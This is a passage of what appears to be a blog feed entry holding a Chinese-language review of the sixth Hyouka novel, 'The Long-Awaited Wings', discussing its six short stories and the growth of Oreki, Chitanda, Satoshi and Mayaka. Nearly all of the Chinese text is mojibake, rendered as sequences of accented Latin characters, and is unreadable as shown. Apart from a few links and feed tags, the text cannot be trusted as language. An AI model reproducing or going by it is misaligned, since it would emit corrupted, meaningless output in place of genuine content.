¡å›­æ¨ç†çš„å°è¯´ï¼Œä½†å®é™…ä¸Šè®¸å¤šæ¢è®¨çš„äº‹ç‰©ä¸€ç‚¹ä¹Ÿä¸æ ¡å›­ï¼Œæ›´ä¸æ˜¯ä¸ºäº†æ¨ç†è€Œæ¨ç†ï¼Œæ›´å¤šçš„æ˜¯å¯¹æˆé•¿ã€ç¤¾ä¼šã€äººç”Ÿä»·å€¼çš„æ€è€ƒã€‚ä¸å…¶è¯´æ˜¯è½»å°è¯´ï¼Œæˆ‘åå‘äºè®¤ä¸ºè¿™æ˜¯çº¯æ–‡å­¦ã€‚ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæˆ‘å–œæ¬¢ã€‚å¸Œæœ›å¤§å®¶èƒ½åˆ†äº«ä¸€ä¸‹å…³äºè¿™æœ¬ä¹¦çš„æ„Ÿæƒ³å§ã€‚"></a>###å‰è¨€<br>å‡†å¤‡çœ‹ä¹‹å‰ï¼Œæˆ‘ç•™æ„åˆ°è¿™æœ¬ä¹¦ä¸å‰å‡ æœ¬æœ‰äº›è®¸ä¸åŒã€‚<br>è‹±æ–‡çš„å‰¯æ ‡é¢˜æ¶ˆå¤±äº†ã€‚å°é¢çš„é…å›¾æ˜¯å¤©å°ï¼Œæ˜¯ä¸€ç§ç”ŸåŠ¨æ˜æ™°çš„è‰²å½©å§ã€‚å¤©ç©ºä¸å¤©å°æŸ“ä¸Šç»¿è‰²è°ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆä»¤æˆ‘ç•™æ„äº†è®¸ä¹…ã€‚<br>ä¸»è¦è¿˜æ˜¯å°åº•çš„æ–‡å­—ä»¤æˆ‘å¾ˆåœ¨æ„ï¼šä¹‹å‰å‡ æœ¬éƒ½åªæ˜¯åœ¨æ­¤æŠ›å‡ºæ‚¬å¿µ&#x2F;ç–‘é—®ï¼Œä»¤è¯»è€…äºä¹¦ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼Œè€Œè¿™é‡Œå´åœ¨åé¢é™„ä¸Šäº†è¿™æ ·çš„æ–‡å­—ï¼š<br><strong>â€œå…¨ä¹¦åˆ†ä¸ºå…­ä¸ªçŸ­ç¯‡ï¼Œåœ¨å……æ»¡æ´»åŠ›åˆå¸¦ç‚¹è‹¦æ¶©çš„æ•…äº‹é‡Œï¼Œå¤ç±ç ”ç©¶ç¤¾å››åæˆå‘˜çš„è¿‡å»å’Œæœªæ¥ä¹Ÿé€æ¸æ˜æœ—â€¦â€¦â€</strong><br>è¯­æ°”åº”è¯¥å¾ˆå¹³æ·¡å§ï¼Œä½†æ˜¯ä»¿ä½›ä¸€ç›´åœ¨æš—ç¤ºæˆ‘è¿™ä¸€éƒ¨ä¸ç®€å•ã€‚è¿™å¥è¯åœ¨è¯•å›¾ä¼ è¾¾ç€ä»€ä¹ˆå—ï¼Ÿå·²ç»ç¡®å®šäº†å…¨ä¹¦çš„åŸºè°ƒå—ï¼Ÿ<br><strong>æˆ‘å¾ˆå¥½å¥‡ã€‚</strong><br>###æ•…äº‹1ï¼šã€Šç®±å†…çš„ç¼ºå¤±ã€‹<br>æ¡ˆä»¶æœ¬èº«ä¸å¤æ‚ã€‚æŠ•ç¥¨çš„ç¥¨æ•°æ¯”äººæ•°å¤šï¼Œäºæ˜¯é‡Œå¿—å‘æŠ˜æœ¨æ±‚åŠ©ã€‚åœ¨2äººçš„æ•£æ­¥ä¸å¯¹è¯ä¸­ï¼ŒçœŸç›¸é€æ¸æµ®å‡ºæ°´é¢ã€‚å›æœ›åŒç³»åˆ—ç¬¬5éƒ¨ã€Šä¸¤äººè·ç¦»çš„æ¦‚ç®—ã€‹ï¼Œå…¨ä¹¦ç”¨æŠ˜æœ¨äºâ€œæ˜Ÿè°·æ¯â€é•¿è·‘ä¸­çš„æ€è€ƒä¸²è”ï¼Œæ­¤å¤„æ‰‹æ³•ä¸å…¶é¢‡ä¸ºç›¸ä¼¼ã€‚<br><strong>å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„æ•…äº‹å¾€å¾€ä¸åœ¨æ¡ˆä»¶æœ¬èº«ã€‚</strong><br>æƒ³æƒ³å°åº•çš„è¯ï¼Œä¸éš¾çŒœåˆ°æ­¤å¤„å†™çš„æ˜¯é‡Œå¿—çš„è½¬å˜ã€‚ç¬¬ä¸‰éƒ¨ã€Šåº“ç‰¹åˆ©äºšèŠ™å¡çš„é¡ºåºã€‹ä¸­ï¼Œé‡Œå¿—æ€»æ˜¯å¿µå¨ç€â€œæ•°æ®åº“æ˜¯å¾—ä¸å‡ºç»“è®ºçš„â€è¿™æ ·çš„è¯ã€‚ï¼ˆé¡ºå¸¦ä¸€æï¼Œç¬¬ä¸‰éƒ¨å¯¹å››äººçš„å½¢è±¡åˆ»ç”»å¾ˆç”ŸåŠ¨ï¼Œä¸ªäººå¾ˆå–œæ¬¢ã€‚ï¼‰ç„¶è€Œä¹‹æ‰€ä»¥ä¸€ç›´å¿µå¨ï¼Œæƒ³å¿…ä¹Ÿæ˜¯å› ä¸ºæœ¬äººä¸ç”˜å¿ƒâ€”â€”å°½ç®¡é‚£æ—¶é‡Œå¿—ä¹Ÿè¯•ç€æ¨ç†ï¼Œä¸è¿‡ä»–å‘ç°è‡ªå·±åšä¸åˆ°ã€‚è€Œåœ¨æ­¤ï¼Œé‡Œå¿—æ˜æ˜¾æ¥å—äº†è‡ªå·±æ²¡æœ‰æŠ˜æœ¨é‚£æ ·çš„æ‰èƒ½çš„äº‹å®ï¼Œæ€æƒ³ä¸Šå·²ç»åšäº†è½¬å˜ï¼Œä»–ä¾æ—§æ˜¯é‚£ä¸ªåœ¨è¡—æœºæ¸¸æˆä¸­è¾“äº†ä¹Ÿç¬‘å¾—ç¿çƒ‚çš„é‡Œå¿—ã€‚ä¸è¿‡é‡Œå¿—å¯¹å…¬å¹³æ­£ä¹‰çš„æ‰§ç€ã€å¯¹è‡ªå·±è®¤ä¸ºæ­£ç¡®çš„äº‹ç‰©çš„åšæŒä»æœªæ”¹å˜ã€‚è‹¥éå¦‚æ­¤ï¼Œä»–ä¾¿ä¸ä¼šä¸ºå­¦å¼Ÿæ‰“æŠ±ä¸å¹³ï¼Œä¾¿ä¸ä¼šå»è¯·æ±‚æŠ˜æœ¨è§£è°œã€‚å˜ä¸ä¸å˜ï¼ŒæŠŠé‡Œå¿—å½¢è±¡åˆ»ç”»çš„æä¸ºé²œæ˜ã€‚è¿™ä¸ªæ•…äº‹çœŸæ­£æƒ³è¦è¡¨è¾¾çš„æ˜¯è¿™æ ·å§ã€‚<br>###æ•…äº‹2ï¼šã€Šé•œä¸­ä¸å¾—è§ã€‹<br>ç”¨æ‘©è€¶èŠ±çš„è§†è§’æ¢å¯»æŠ˜æœ¨çš„è¿‡å»â€”â€”æœ‰æ„æ€çš„è§†è§’ã€‚æ—©å·²ç–‘æƒ‘æ‘©è€¶èŠ±ä¹‹å‰ä¸ºä»€ä¹ˆä¼šè®¨åŒæŠ˜æœ¨ï¼Œæœ¬ç¯‡åˆ™è¿›è¡Œäº†è§£ç­”ï¼Œæ¯•ç«Ÿå¤ç±ç ”ç©¶ç¤¾ç³»åˆ—å‘æ¥æ˜¯é‡ç‚¹åœ¨äºæ¡ˆä»¶èƒŒåã€‚ä»–çš„åˆä¸­åŒå­¦ä»¬ä¼šè®¨åŒä»–ä»…ä»…æ˜¯å› ä¸ºä¸€æ¬¡è¯¯ä¼šï¼Œè€ŒæŠ˜æœ¨é€‰æ‹©äº†æ²‰é»˜ã€‚åœ¨æ‘©è€¶èŠ±çš„å¥½å¥‡å¿ƒé©±ä½¿ä¸‹ï¼Œç»ˆäºäº†è§£äº†æŠ˜æœ¨æ‰€ä½œæ‰€ä¸ºçš„åŸå› ã€‚åœ¨æ‘©è€¶èŠ±é“æ­‰ä¹‹åï¼ŒæŠ˜æœ¨çœ‹ä¼¼æ¼«ä¸ç»å¿ƒï¼Œä½†æ˜¯ä¸€å¥â€œæŠ˜æœ¨çš„è§†çº¿æ¸¸ç§»ä¸å®šâ€çš„æå†™å±•ç°äº†ä»–å†…å¿ƒçš„æ·±å—è§¦åŠ¨ã€‚è¿™ä¸€ç¯‡æ•…äº‹åˆ»ç”»äº†æŠ˜æœ¨åšå¥½äº‹ä¸ç•™åçš„â€œè‹±é›„â€å½¢è±¡ï¼Œå…¶å®ä¹Ÿä¾§é¢åæ˜ äº†æŠ˜æœ¨æœ¬èº«å¹¶ä¸æ¶ˆæã€‚æŠ˜æœ¨éª¨å­é‡Œå’Œé‡Œå¿—æ˜¯ä¸€æ ·çš„ï¼Œåƒåç”°åªæ˜¯å”¤é†’äº†ä»–çš„æ¿€æƒ…ã€‚ä¸ªäººè®¤ä¸ºæ­¤æ–‡æ¶‰åŠåˆ°äº†æ ¡å›­æ¬ºå‡Œï¼Œä»æ—è§‚è€…çš„è§’åº¦å‡ºå‘å±•ç°äº†æ ¡å›­â€œå†·æš´åŠ›â€çš„å¯æ€•ã€‚æ—è§‚è€…ä¸åº”æ—è§‚ã€‚è‹¥ç›´æ¥ä»‹å…¥ä¸å¦¥ï¼Œæš—ä¸­å¸®åŠ©ä¸å¤±ä¸ºä¸€ç§å¥½æ–¹æ³•â€”â€”ç±³æ³½ç©—ä¿¡ä¹Ÿè®¸æƒ³ä¼ è¾¾çš„æ˜¯è¿™ä¸ªã€‚<br>ä¸å¾—è§çš„ï¼ŒçœŸçš„åœ¨é•œä¸­å—ï¼Ÿ<br>###æ•…äº‹3ï¼šã€Šç¾¤å±±å·²æ”¾æ™´ï¼Ÿã€‹<br>æŠ˜æœ¨æ¢æ˜äº†å®é™…ä¸Šä¸å–œæ¬¢ç›´å‡æœºçš„è€å¸ˆåœ¨æŸæ—¥æ—©æ™¨è¯´å‡ºâ€œæˆ‘å–œæ¬¢ç›´å‡æœºâ€çš„ç¼˜ç”±ã€‚çœ‹åˆ°ä¸€åŠçš„æ—¶å€™å…¶å®å¤§éƒ¨åˆ†äººä¾¿éƒ½èƒ½æ¨¡æ¨¡ç³Šç³ŠçŒœåˆ°ç¼˜ç”±äº†ã€‚å½“ç„¶é‡ç‚¹ä¾æ—§ä¸åœ¨æ¡ˆä»¶ä¸Šã€‚<br><strong>æŠ˜æœ¨è¯´å‡ºâ€œæˆ‘å¾ˆå¥½å¥‡â€</strong>çš„æ—¶å€™ï¼Œæ— è®ºé‡Œå¿—ã€åƒåç”°ã€æ‘©è€¶èŠ±è¿˜æ˜¯è¯»è€…éƒ½ä¼šå¤§åƒä¸€æƒŠå§ã€‚è¿™åˆ™æ•…äº‹ä¸é•¿ï¼Œåƒæ˜¯ä¸€ç§è¿‡æ¸¡ã€‚ç„¶è€Œè¯´åˆ°è¿‡æ¸¡å°±ä¼šæƒ³åˆ°è½¬å˜â€”â€”èŠ‚èƒ½ä¸»ä¹‰çš„æŠ˜æœ¨å¼€å§‹æ¸´æœ›æœ¬ä¹¦ä¸­æ‰€è¯´çš„â€œç«ç‘°è‰²çš„äººç”Ÿâ€ã€‚æŸç§ç¨‹åº¦ä¸Šï¼ŒæŠ˜æœ¨å·²ç»æ”¾å¼ƒäº†èŠ‚èƒ½ä¸»ä¹‰ã€‚åƒåç”°æ˜¯å¼•å­ï¼Œæ ¹æœ¬åŠ¨åŠ›æ˜¯åŒé‡Œå¿—ä¸€æ ·çš„ã€å†…å¿ƒæ·±å¤„å¯¹æŸäº›ä¸œè¥¿çš„æ‰§ç€å’Œæ¸´æœ›ã€‚<br>æˆ‘ç›¸ä¿¡é‡Œå¿—åœ¨æ•´ä¸ªç³»åˆ—ä¸­æ›´åƒæ˜¯æŠ˜æœ¨çš„çœŸæˆ‘ä¹‹ä½“ç°ã€‚é€šè¿‡ä¸¤äººè¡¨ç°çš„å·®å¼‚ï¼Œä¾¿èƒ½çœ‹å‡ºæŠ˜æœ¨è·ç¦»çœŸæ­£çš„è‡ªæˆ‘è¿˜æœ‰å¤šè¿œã€‚è¿™æ˜¯æˆ‘å¯¹é‡Œå¿—çš„ç†è§£ï¼šæŠ˜æœ¨å†…å¿ƒçš„é•œåƒã€‚<br>###æ•…äº‹4ï¼šã€Šæˆ‘ä»¬çš„ä¼ è¯´ä¹‹ä¹¦ã€‹<br>æ‘©è€¶èŠ±çš„è§†è§’ã€‚çœŸç›¸çš„æ­ç¤ºè€…å°±æ˜¯â€œå‡¶æ‰‹â€æœ¬äººï¼Œååˆ†æœ‰è¶£ã€‚æœ¬æ–‡æ¢è®¨äº†ä¸€ä¸ªé—®é¢˜ï¼š<strong>ä¸ªä½“åœ¨é›†ä½“ä¹‹ä¸­ï¼Œåº”è¯¥ä¸ºäº†é›†ä½“çš„åˆ©ç›Šè€Œç‰ºç‰²è‡ªå·±ï¼Œè¿˜æ˜¯åº”è¯¥ä¸ºäº†è‡ªå·±çš„å‰é€”è€Œæ”¾å¼ƒé›†ä½“ï¼Ÿ</strong><br>æ²³å†…å­¦å§è‡ªå·±é€€å‡ºæ¼«ç ”ï¼Œå´å®‰æ’ç¾½ä»æ‹…ä»»ç¤¾é•¿ï¼Œæ€å¯è°“æ”¾ä¸‹ï¼Ÿè€Œå…¶åŠæ‘©è€¶èŠ±é€€å‡ºä¹Ÿæ˜¯ä¸ºäº†æ¼«ç ”ä¸æ‘©è€¶èŠ±çš„åˆ©ç›Šæœ€å¤§åŒ–ã€‚ç°å®ç”Ÿæ´»å¾€å¾€ä¸ä¼šå‡ºç°æ•…äº‹ä¸­æ¼«ç ”å®Œå…¨ä¸¤æåˆ†åŒ–çš„æƒ…å†µã€‚æ— è®ºåšå‡ºä»€ä¹ˆé€‰æ‹©ï¼Œæ€»æœ‰äººè¦å—ä¼¤ã€‚å› æ­¤ï¼Œæˆ‘æ›´å€¾å‘äºéµå¾ªè‡ªå·±çš„æœ¬å¿ƒã€‚æ‘©è€¶èŠ±çš„é€‰æ‹©ä¹Ÿè®¸ä¸ä¸€å®šæ­£ç¡®ï¼Œæ›´æœ‰å¯èƒ½æ ¹æœ¬æ— å¯¹é”™ä¹‹åˆ†ï¼Œä½†å¥¹è‡³å°‘éµä»äº†è‡ªå·±çš„æœ¬å¿ƒã€‚<br>###æ•…äº‹5ï¼šã€Šæ‚ é•¿çš„å‡æœŸã€‹<br>è¿™åˆ™æ•…äº‹è¯¦ç»†è¯´æ˜äº†æŠ˜æœ¨æˆä¸ºèŠ‚èƒ½ä¸»ä¹‰è€…çš„åŸå› ã€‚æ•…äº‹çš„ç»“å°¾å€ŸæŠ˜æœ¨çš„å§å§ä¹‹å£è¯´äº†è¿™ä¹ˆä¸€å¥è¯ï¼š<br><strong>â€œä»Šåä½ ä¼šè¿æ¥æ‚ é•¿çš„å‡æœŸï¼Œè¿™æ ·ä¹Ÿå¥½ï¼Œä½ å°±å¥½å¥½ä¼‘æ¯å§ï¼Œæ²¡é—®é¢˜ï¼Œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜ã€‚â€</strong><br>è¿™é‡Œçš„â€œæ‚ é•¿å‡æœŸâ€å…¶å®æ˜¯<strong>ä¸€è¯­ä¸‰å…³</strong>ï¼Œæ—¢å®æŒ‡æŠ˜æœ¨å³å°†è¿æ¥çš„æ¼«é•¿æš‘å‡ï¼Œä¹Ÿæš—æŒ‡æŠ˜æœ¨ä¹‹åæ¼«æ¼«æ— æœŸçš„èŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ï¼Œæ›´æŒ‡çš„æ˜¯å†…å¿ƒçš„ç¼“æ…¢æ”¹å˜ã€‚â€œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜â€ï¼Œæš—å–»äº†æŠ˜æœ¨å³å°†å˜æˆä¸€ä¸ªèŠ‚èƒ½ä¸»ä¹‰è€…ï¼ŒèŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ä¸­å†…å¿ƒå´å¹¶ä¸åšå®šï¼Œç»ˆå°†è½¬å˜æ€æƒ³ã€‚æ•…äº‹æœ€ååˆåŠ äº†ä¸€å¥ï¼šâ€œä¹Ÿä¼šæœ‰äººæ¥ç»“æŸä½ è¿™æ‚ é•¿çš„å‡æœŸã€‚â€è¯´æ˜æš‘å‡ç»ˆå°†è¿‡å»ï¼ŒèŠ‚èƒ½ä¸»ä¹‰çš„ç”Ÿæ´»å°†ä¸å†ï¼Œå†…å¿ƒæœ€ç»ˆä¹Ÿä¼šå®Œæˆè½¬å˜ï¼Œæ›´åŠ æˆç†Ÿã€‚ç±³æ³½ç©—ä¿¡åˆ»æ„å®‰æ’æŠ˜æœ¨å’Œåƒåç”°äºŒäººåœ¨è¿™ä¸ªæ•…äº‹é‡Œäº’åŠ¨ï¼Œä¼ è¾¾ç€æ‰€è°“çš„â€œæœ‰äººâ€å°±æ˜¯åƒåç”°ï¼Œæœ¬æ–‡æ˜¯å®˜æ–¹å‘ç³–çš„é“ºå«ä¹‹ä¸€ã€‚<br>###æ•…äº‹6ï¼šã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹<br>ä¸ç®€å•çš„ä¸€éƒ¨ä¹¦çš„æœ€åä¸€ç« ï¼Œä¸”æ ‡é¢˜å’Œä¹¦çš„æ ‡é¢˜ç›¸åŒï¼Œæš—ç¤ºç€å…¶åˆ†é‡ä¹‹é‡ã€‚ç±³æ³½ç©—ä¿¡æ›´ä¸ºç”¨å¿ƒåœ°å»åˆ»ç”»äº†äººç‰©å½¢è±¡ã€‚ç¯‡å¹…ä¸Šç¨é•¿ï¼Œæ•…äº‹çš„æ¶æ„å’Œç«‹æ„æ›´æ˜¯é«˜æ˜ï¼Œå…·å¤‡ä¸°å¯Œçš„æˆå‰§æ€§å’Œæ€æƒ³ã€‚å‰é¢å‡ ä¸ªæ•…äº‹éƒ½æ˜¯åœ¨è®²æŠ˜æœ¨ã€ç¦éƒ¨å’Œä¼ŠåŸï¼Œæœ€åä¸€ä¸ªè‡ªç„¶ç•™ç»™äº†åƒåç”°çˆ±ç‘ ã€‚<br>â€œæ¡ˆä»¶â€çš„èµ·å› æ˜¯æœ‰ä¸€å¤©åƒåç”°çš„çˆ¶äº²çªç„¶å‘Šè¯‰å¥¹ä¸ä¸€å®šè¦å†ç»§æ‰¿å®¶ä¸šäº†ã€‚æ¯”å–»ä¸ºä¸€é“é€‰æ‹©é¢˜çš„è¯ï¼Œâ€œä¸å¿…é¡»â€å°±æ„å‘³ç€å³å¯ç”¨é€‰ç»§æ‰¿å®¶ä¸šï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸ç»§æ‰¿ï¼Œå› æ­¤åœ¨æˆ‘ä»¬çœ‹æ¥è¿™å®æ˜¯ä¸€é“å¼€æ”¾çš„é€åˆ†é¢˜ï¼Œé€‰æ‹©ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œå‡ºè·¯å˜å¤šäº†ï¼Œåº”è¯¥å¼€å¿ƒæ‰å¯¹ï¼Œåœ¨æ—äººçœ‹æ¥åƒåç”°æ ¹æœ¬ä¸å¿…è¿™ä¹ˆçƒ¦æ¼ï¼Œç„¶è€Œåœ¨åƒåç”°çœ¼ä¸­æƒ…å†µå´å¹¶éå¦‚æ­¤ã€‚å› ä¸ºå¥¹ä¸æ˜ç™½è¯¥ä¸è¯¥ç”¨è¿™è¿Ÿæ¥çš„ç¿…è†€å±•ç¿…é£ç¿”ã€‚<br>ä¸ç¦æƒ³è¯´å°è¯´è¯»æ¥æ€»æ˜¯å¼¥æ¼«ç€ä¸€ç§æ·¡æ·¡çš„è‹¦æ¶©ï¼ˆå¦‚åŒå°åº•æ–‡å­—æ‰€è¯´ï¼‰ï¼Œè¿œæ²¡æœ‰åŠ¨ç”»æ¥çš„æ˜å¿«ã€‚ç¬¬ä¸€éƒ¨ã€Šå†°è“ã€‹çš„I screamå·²ç»ä¸ºæ•´ä¸ªç³»åˆ—å¥ å®šäº†åŸºè°ƒã€‚ç¬¬ä¸€éƒ¨ä¹¦ä¸­åƒåç”°çš„èˆ…èˆ…å…³è°·çº¯æ›¾è¿™æ ·è·Ÿå¹´å¹¼çš„åƒåç”°è§£é‡Šâ€œå†°è“â€ï¼š<br><strong>â€œæ˜¯è¦å˜åšå¼ºçš„æ„æ€ã€‚å¦‚æœè½¯å¼±çš„è¯ï¼Œæ€»æœ‰ä¸€å¤©ä¼šè¿æ‚²é¸£éƒ½å‘ä¸å‡ºæ¥ã€‚è¿™æ ·çš„è¯ï¼Œå°±ç®—æ´»ç€ï¼Œä¹Ÿåªæ˜¯è¡Œå°¸èµ°è‚‰ã€‚â€</strong><br>ä½œè€…å€Ÿèˆ…èˆ…ä¹‹å£è¯´è¿™æ®µè¯æš—æŒ‡çš„è‡ªç„¶æ˜¯èº«ä¸ºå®¶æ—ç»§æ‰¿äººçš„åƒåç”°çš„æŸç§å‘½è¿ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¹´å¹¼çš„åƒåç”°åœ¨å¬å®Œèˆ…èˆ…çš„è¿™å¥è¯åå°±å“­äº†ã€‚å¥¹å†…å¿ƒä¸€å®šæ˜¯å¯¹è‡ªå·±â€œç¬¼ä¸­é¸Ÿâ€çš„å‘½è¿åšè¿‡æŸç§æŠ—äº‰çš„ï¼Œä½†å¥¹è®¤ä¸ºè¿™ç§æŠ—äº‰æ— æ³•æ”¹å˜ä»€ä¹ˆï¼Œäºæ˜¯å°±æ­¤æ”¾å¼ƒã€‚ç„¶è€Œæœ‰ä¸€å¤©è¿™ä»¶äº‹çœŸçš„æˆçœŸäº†ï¼Œè¿™ä¸ªæ—¶å€™åƒåç”°æ‰å‘ç°è‡ªå·±å¹¶æ²¡æœ‰ä¸ºæ­¤åšè¿‡ä»»ä½•å‡†å¤‡ï¼Œç”šè‡³è¿è¿™ä»¶äº‹æœ¬èº«æ˜¯ä¸æ˜¯è‡ªå·±çœŸçš„æƒ³è¦çš„ä¹Ÿè¦é‡æ–°æ€è€ƒï¼Œè¿™ä¸ªæ—¶å€™æ‰çœŸæ­£å¼€å§‹æƒ¶æã€‚<br>æŠ˜æœ¨å¯¹è¿™ç§å¿ƒç†æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„æ¯”å–»ï¼šå¥½æ¯”æœ‰äº›ä¸ä¿¡è€¶ç¨£çš„äººå”±èµæ­Œä¼šè§‰å¾—åˆ«æ‰­ä¸€æ ·ã€‚åŸæœ¬æ²¡æœ‰è‡ªç”±çš„åƒåç”°èƒ½å”±å‡ºæ†§æ†¬è‡ªç”±çš„æ­Œè¯ï¼Œä½†å½“å¥¹çœŸæ­£æœ‰äº†è‡ªç”±ååè€Œå”±ä¸å‡ºæ¥äº†ï¼Œçœ‹ä¼¼çŸ›ç›¾ï¼Œå®åˆ™ç¬¦åˆäººç‰©å¿ƒå¢ƒã€‚æ­£å¦‚æ•…äº‹çš„æ ‡é¢˜ã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹æ‰€æƒ³ä¼ è¾¾ç»™æˆ‘ä»¬çš„æ„ä¹‰ï¼šç¬¼ä¸­çš„é¸Ÿå„¿ä¼šæ†§æ†¬è‡ªç”±ï¼Œç„¶è€Œæ‰“å¼€é¸Ÿç¬¼åï¼Œå®ƒä»¬å´ä¼šå› <strong>è¿Ÿæ¥çš„ç¿…è†€</strong>è€Œææƒ§ã€‚å…¶å®ï¼Œæœ¬ä¹¦çš„å¦ä¸€ä¸ªè¯‘å<strong>â€œäº‹åˆ°å¦‚ä»Šæ‰å«æˆ‘é£ç¿”â€</strong>æ›´è´´è¿‘åŸæ—¥æ–‡æ ‡é¢˜çš„ç›´è¯‘ï¼Œå¤§å¯ä»¥ä½“ä¼šä¸€ä¸‹ä¸ªä¸­å«ä¹‰ã€‚<br><strong>â€œè¿™è¿Ÿæ¥çš„ç¿…è†€ï¼Œè®©æˆ‘ä¸çŸ¥æ‰€æªã€‚â€</strong><br>åƒåç”°è¯´å‡ºçš„è¿™å¥è¯å†²å‡»åŠ›å·¨å¤§ã€‚<br>å¿½ç„¶è€Œè‡³çš„è‡ªç”±ï¼Œå……æ»¡æœªçŸ¥ä¸å¯èƒ½æ€§çš„äººç”Ÿï¼Œå¦‚æ­¤ä¹‹å¤§çš„å†²å‡»ï¼Œå¿…ç„¶åŠ¨æ‘‡äº†åƒåç”°å¤šå¹´æ¥ä½œä¸ºåƒé‡‘åƒåç”°æ‰€å­˜åœ¨çš„æ„ä¹‰ã€‚å³ä½¿æˆ‘ä»¬ä¸çŸ¥é“åƒåç”°åŸæœ¬æ„¿æ„è¢«ç»§æ‰¿äººçš„èº«ä»½æŸç¼šä¸å¦ï¼Œä¹Ÿä¸çŸ¥é“å¥¹æ˜¯å¦çœŸçš„æ¸´æœ›è‡ªç”±ï¼Œä½†èƒ½ç¡®å®šçš„æ˜¯ï¼Œå¥¹é¢å¯¹æ— é™å¯èƒ½æ€§æ—¶çš„è¿·èŒ«ç»ä¸ä¼šæŒä¹…ã€‚<br>æ•…äº‹åœ¨æŠ˜æœ¨æ‰¾åˆ°åƒåç”°åæˆ›ç„¶è€Œæ­¢ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºç­”æ¡ˆï¼Œä¹Ÿå°±æ˜¯è¯´åšå‡ºä»€ä¹ˆé€‰æ‹©å·²ç»ä¸é‡è¦äº†ã€‚å› ä¸ºè¿™ä¸ªå‘½é¢˜ä¸æ˜¯æˆ‘ä»¬æ¯ä¸€ä¸ªäººéœ€è¦æ€è€ƒçš„ï¼š**çœŸæ­£æŸç¼šæˆ‘ä»¬çš„åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯æ— å½¢çš„å‘½è¿ç‰¢ç¬¼ï¼Œè¿˜æ˜¯å¯¹æ”¹å˜çš„ææƒ§ï¼Ÿ  **<br>è¿™æœ¬ä¹¦æ²¡æœ‰åè®°ï¼Œå†æ€ä¹ˆçœ‹æœ€åä¸€é¡µéƒ½åªæ˜¯å†·å†°å†°çš„å›¾ä¹¦åœ¨ç‰ˆç¼–ç›®æ•°æ®ï¼Œæˆ‘ç›¸ä¿¡æ²¡æœ‰åè®°æ˜¯å› ä¸ºç±³æ³½ç©—ä¿¡å¸Œæœ›æœ€åè¿™å‡ æ®µå¯¹è¯èƒ½ä¹…ä¹…ç•™å­˜åœ¨è¯»è€…è„‘æµ·ï¼Œæ¯•ç«Ÿè¿™éƒ¨ä¹¦ç›¸è¾ƒäºå‰å‡ éƒ¨å¾ˆç‰¹åˆ«ã€‚<br>ä¸è¿‡ä»¤äººæ„‰æ‚¦çš„æ˜¯ï¼Œæ­¤å¤„å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„å¦ä¸€æ¡çº¿æ¸æ¸æµ®å‡ºï¼šæŠ˜æœ¨ä¸åƒåç”°çš„å…³ç³»ã€‚åƒåç”°å¼•å¯¼äº†æŠ˜æœ¨é‡æ–°æ¸´æœ›ç«ç‘°è‰²çš„äººç”Ÿï¼ŒåŠ¨æ‘‡äº†æŠ˜æœ¨â€œèŠ‚èƒ½ä¸»ä¹‰â€çš„ä¿¡æ¡ï¼Œæˆä¸ºäº†ç»“æŸæŠ˜æœ¨â€œæ‚ é•¿çš„å‡æœŸâ€çš„é‚£ä¸ªäººã€‚å¯ä»¥è¯´ï¼ŒæŠ˜æœ¨å·²ç»å–œæ¬¢ä¸Šäº†å¥¹ã€‚æ—¢ç„¶åƒåç”°çš„è¿·èŒ«ä¸ä¼šæŒä¹…ï¼Œå› ä¸ºæ­¤æ¬¡ç»å†ï¼Œåƒåç”°åœ¨æ­¤ä¹‹åå¿…ç„¶ä¼šå’ŒæŠ˜æœ¨åŠ æ·±ç¾ç»Šã€‚è¯·æœŸå¾…å§ã€‚<br>##PSâ€¦â€¦ï¼Ÿï¼š<br>è¯´æ˜¯æ ¡å›­æ¨ç†çš„å°è¯´ï¼Œä½†å®é™…ä¸Šè®¸å¤šæ¢è®¨çš„äº‹ç‰©ä¸€ç‚¹ä¹Ÿä¸æ ¡å›­ï¼Œæ›´ä¸æ˜¯ä¸ºäº†æ¨ç†è€Œæ¨ç†ï¼Œæ›´å¤šçš„æ˜¯å¯¹æˆé•¿ã€ç¤¾ä¼šã€äººç”Ÿä»·å€¼çš„æ€è€ƒã€‚ä¸å…¶è¯´æ˜¯è½»å°è¯´ï¼Œæˆ‘åå‘äºè®¤ä¸ºè¿™æ˜¯çº¯æ–‡å­¦ã€‚<br>ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæˆ‘å–œæ¬¢ã€‚<br>å¸Œæœ›å¤§å®¶èƒ½åˆ†äº«ä¸€ä¸‹å…³äºè¿™æœ¬ä¹¦çš„æ„Ÿæƒ³å§ã€‚</h2><p>å‚è€ƒ<a href="//www.zhihu.com/question/39576283/answer/82242206">è€³æœµè¯»ä¹¦ | è¯»ã€Šå†°è“å·6Â·è¿Ÿæ¥çš„ç¿…è†€ã€‹æœ‰æ„Ÿ</a><br>å¥‰ä¸Šå¾ˆæ£’çš„è¯„è®ºï¼š<a href="//www.zhihu.com/question/21576885/answer/29840285">å¦‚ä½•è¯„ä»·ã€Šå†°è“ã€‹è¿™éƒ¨åŠ¨ç”»ï¼Ÿ-Nasusuçš„å›ç­”</a></p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†°è“ </tag>
            
            <tag> å¤ç±ç ”ç©¶ç¤¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·å†¬ä»¤è¥éšæƒ³</title>
